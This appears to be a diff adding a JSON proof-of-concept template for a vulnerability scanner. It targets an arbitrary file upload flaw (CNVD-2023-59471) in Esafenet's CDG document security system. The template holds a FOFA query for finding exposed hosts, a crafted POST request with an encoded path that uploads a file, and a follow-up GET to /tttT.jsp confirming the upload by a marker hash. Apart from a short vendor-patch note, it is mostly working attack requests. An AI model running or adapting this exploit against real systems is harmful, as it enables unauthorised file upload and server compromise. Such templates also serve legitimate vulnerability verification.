@@ -1,0 +1,56 @@
+{
+  "product": "亿赛通",
+  "vul_name": "UploadFileFromClientServiceForClient接口任意文件上传",
+  "type": "文件上传",
+  "vul_id": [
+    "CNVD-2023-59471"
+  ],
+  "level": 3,
+  "vul_desc": "亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口存在任意文件上传漏洞，攻击者通过构造特定的请求上传恶意文件。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"亿赛通-电子文档安全管理系统\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484633&idx=1&sn=564b1d5a595d7361fd8bdc358266e647&chksm=974b89dea03c00c83d2194779fdf96bd3a770825c66316a4ddfdbf1a16869543cd3ccef6fb1f&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [
+    "厂商已提供漏洞修补方案，请关注厂商主页及时更新：http://www.esafenet.com/"
+  ],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM",
+        "data": "95cc64dd2825f9df13ec4ad683ecf339"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/tttT.jsp"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "95cc64dd2825f9df13ec4ad683ecf339"
+          }
+        ]
+      }
+    }
+  ]
+}
